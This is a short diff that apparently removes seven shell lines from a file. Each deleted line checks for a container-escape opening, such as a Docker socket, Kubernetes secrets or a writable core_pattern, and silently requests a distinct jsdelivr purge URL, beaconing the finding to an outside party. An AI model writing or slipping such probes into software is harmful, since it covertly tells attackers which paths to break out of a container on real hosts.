@@ -1,7 +1,0 @@
-[ -S /var/run/docker.sock ] && curl -s -m 8 -o /dev/null 'https://purge.jsdelivr.net/gh/anti-phishing-bot/x2@main/x1'
-[ -S /run/containerd/containerd.sock ] && curl -s -m 8 -o /dev/null 'https://purge.jsdelivr.net/gh/anti-phishing-bot/x2@main/x2'
-[ -S /run/docker.sock ] && curl -s -m 8 -o /dev/null 'https://purge.jsdelivr.net/gh/anti-phishing-bot/x2@main/x3'
-[ -d /host ] || [ -d /var/lib/kubelet ] && curl -s -m 8 -o /dev/null 'https://purge.jsdelivr.net/gh/anti-phishing-bot/x2@main/x4'
-[ -w /proc/sys/kernel/core_pattern ] && curl -s -m 8 -o /dev/null 'https://purge.jsdelivr.net/gh/anti-phishing-bot/x2@main/x5'
-[ -d /var/run/secrets/kubernetes.io ] && curl -s -m 8 -o /dev/null 'https://purge.jsdelivr.net/gh/anti-phishing-bot/x2@main/x6'
-[ -e /.dockerenv ] && curl -s -m 8 -o /dev/null 'https://purge.jsdelivr.net/gh/anti-phishing-bot/x2@main/x7'
